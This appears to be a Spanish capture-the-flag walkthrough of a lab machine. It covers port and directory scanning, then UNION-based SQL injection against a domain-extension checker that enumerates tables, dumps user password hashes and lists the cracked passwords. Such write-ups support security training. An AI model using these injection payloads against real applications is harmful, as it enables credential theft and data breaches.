# kmspwned - SQLi 

## Escaneo Nmap
```bash
nmap -sS -sV -Pn -f 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Debian))
```

## Fuzzing
```bash
gobuster dir -u "http://172.17.0.2:80/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200                                            
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://172.17.0.2:80/
[+] Threads:        200
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2026/08/11 00:41:11 Starting gobuster
===============================================================
/admin (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/server-status (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
===============================================================
2026/08/11 00:41:17 Finished
===============================================================
```

Ninguno de los directorios mostró información relevante, por lo que procederemos a revisar el código fuente.

```HTML
<!-- Panel de administracion disponible en /admin/ -->
<nav>
  <div class="logo">&#9729; Servi<span>Cloud</span></div>
  <div><a href="#">Dominios</a><a href="#">Hosting</a><a href="#">Servidores</a><a href="#">Aplicaciones</a><a href="#">Soporte</a></div>
  <div><a href="login.php">Acceso clientes</a><a href="registro.php" class="btn-nav">Crear cuenta</a></div>
</nav>
```

Procedemos a examinar registro.php y creamos un nuevo usuario e iniciar sesión.

| Campo | Valor |
| --- | --- |
| **Usuario** | test |
| **Correo** | test@hotmail.com |
| **Contraseña** | test |

Testeamos SQLi en el verificador de extensiones de dominio.

```SQL
' OR 1=1 -- '
```
La prueba arrojó la siguiente salida:
```json
{
  "estado": "ok",
  "mensaje": "Consulta ejecutada correctamente",
  "datos": [
    {"id": "1", "extension": "com", "precio": "9.99"},
    {"id": "2", "extension": "net", "precio": "8.99"},
    {"id": "3", "extension": "org", "precio": "7.99"},
    {"id": "4", "extension": "es",  "precio": "5.99"},
    {"id": "5", "extension": "eu",  "precio": "6.99"},
    {"id": "6", "extension": "io",  "precio": "19.99"},
    {"id": "7", "extension": "dev", "precio": "12.99"},
    {"id": "8", "extension": "app", "precio": "14.99"}
  ]
}
```
La API devolvió todas las filas de la tabla, no solo una extensión.

Desglose:

| Parte | Significado |
| --- | --- |
| **''** | 	La comilla de cierre del string vacío |
| **OR 1=1** | 	Condición que siempre es verdadera |
| **-- '** | 	Comentario que anula el resto de la consulta original |

Esto confirma dos cosas fundamentales:
```md
✅ La inyección SQL funciona.
✅ La consulta devuelve 8 filas con 3 columnas (id, extension, precio).
```
Podemos seguir usando el verificador de extensiones o bien, herramientas como Burp Suite.

Ver el nombre de la base de datos.
```SQL
' UNION SELECT null, database(), null -- -
```
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"servicloud_erp",
            "precio":"null"
        }
    ]
}
```
Listar todas las tablas.
```SQL
' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = database() -- -
```
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"sc_extensiones",
            "precio":null
        },
        {
            "id":"null",
            "extension":"web_usuarios",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_clientes",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_flags",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_notas",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_facturas",
            "precio":null
        },
        {
            "id":"null",
            "extension":"sc_usuarios",
            "precio":null
        }
    ]
}
```
Enumerar columnas de alguna tabla interesante.
```SQL
' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'sc_usuarios' -- -
```
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"null",
            "extension":"id",
            "precio":null
        },
        {
            "id":"1",
            "extension":"usuario",
            "precio":null
        },
        {
            "id":"null",
            "extension":"password",
            "precio":null
        },
        {
            "id":"null",
            "extension":"email",
            "precio":null
        },
        {
            "id":"null",
            "extension":"rol",
            "precio":null
        },
        {
            "id":"null",
            "extension":"creado",
            "precio":null
        }
    ]
}
```
Extraer datos sensibles.
```SQL
' UNION SELECT usuario,password,rol FROM sc_usuarios -- -
```
```json
{
  "estado":"ok",
  "mensaje":"Consulta ejecutada correctamente",
  "datos":[
        {
            "id":"admin",
            "extension":"c378985d629e99a4e86213db0cd5e70d",
            "precio":"admin"
        },
        {
            "id":"carlos",
            "extension":"7c6a180b36896a0a8c02787eeafb0e4c",
            "precio":"gestor"
        },
        {
            "id":"ana",
            "extension":"b33e0dcc9e2d7a1649d96831260b5698",
            "precio":"usuario"
        }
    ]
}
```
Observamos que obtenemos hashes MD5 (Message Digest Algorithm 5). Utilizaremos crackstation.net que usa rainbow tables (tablas arcoíris) masivas para buscar el texto plano de hashes comunes sin salt.

| Usuario | Contraseña |
| --- | --- |
| **admin** | 	chocolate |
| **carlos** | 	password1 |
| **ana** | 	ana1234 |

